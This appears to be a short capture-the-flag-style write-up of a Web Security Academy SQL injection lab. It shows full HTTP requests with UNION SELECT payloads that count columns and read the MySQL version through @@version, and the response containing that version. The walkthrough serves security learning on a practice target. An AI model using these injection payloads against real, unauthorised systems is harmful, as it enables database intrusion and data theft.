# SQL injection attack, querying the database type and version on MySQL and Microsoft

### First I checked how many columns are there and in last added `#` for commenting the rest , as this works for MySQL and Microsoft. And got 200 response.
**Request**
```http
GET /filter?category=Tech+gifts'+UNION+SELECT+NULL,+NULL# HTTP/2
Host: 0aab00100374c6dc804721fb0084009b.web-security-academy.net
Cookie: session=[REDACTED]
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aab00100374c6dc804721fb0084009b.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```
---

### To check the version used `@@version` and the got the version no. 
**Request**
```http
GET /filter?category=Tech+gifts'+UNION+SELECT+@@version,+NULL# HTTP/2
Host: 0aab00100374c6dc804721fb0084009b.web-security-academy.net
Cookie: session=[REDACTED]
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aab00100374c6dc804721fb0084009b.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```


**Response**
```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 12464

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>SQL injection attack, querying the database type and version on MySQL and Microsoft</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js">
        [...middle portion omitted...]
                      </td>
                  </tr>
                  <tr>
                      <th>8.0.42-0ubuntu0.20.04.1</th>
                  </tr>
              </tbody>
        </table>
    </div>
</section>
<div class="footer-wrapper">
</div>
</div>
</body>
</html>
```















